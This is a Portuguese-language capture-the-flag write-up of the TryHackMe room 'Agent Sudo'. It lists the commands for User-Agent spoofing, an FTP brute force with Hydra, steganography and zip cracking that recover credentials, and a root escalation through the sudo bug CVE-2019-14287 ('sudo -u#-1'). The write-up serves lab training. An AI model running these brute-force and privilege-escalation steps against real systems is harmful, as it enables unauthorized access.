Agent Sudo

TryHackMe · Easy by Brenno M.

Agent Sudo passa por manipulação de User-Agent, brute-force de FTP, uma cadeia de esteganografia para extrair credenciais e termina com a escalação de privilégios pela clássica CVE-2019-14287 do sudo.

Reconhecimento

O Nmap revela FTP, SSH e HTTP. A página web pede a identificação do agente pelo cabeçalho User-Agent (codinome de uma letra), revelando o usuário chris.

nmap -sS -sV -Pn <IP>
curl -A 'C' http://<IP>/

Foothold

Um brute-force de FTP com o Hydra recupera a senha de chris. No FTP há duas imagens; a análise com steghide/binwalk extrai um zip protegido por senha, quebrado com o John, que revela as credenciais SSH de james.

hydra -l chris -P rockyou.txt ftp://<IP>
ftp <IP>   # chris:<SENHA>

steghide extract -sf cute-alien.jpg
binwalk -e cutie.png
zip2john 8702.zip > zip.hash && john --wordlist=rockyou.txt zip.hash
ssh james@<IP>   # senha: <SENHA>

Escalação - CVE-2019-14287

O sudo -l mostra que james pode rodar um comando como qualquer usuário exceto root ((ALL, !root)). Versões antigas do sudo interpretam o UID -1 como 0 (root), burlando a restrição.

sudo -l
sudo -u#-1 /bin/bash
id   # uid=0(root)
cat /root/root.txt
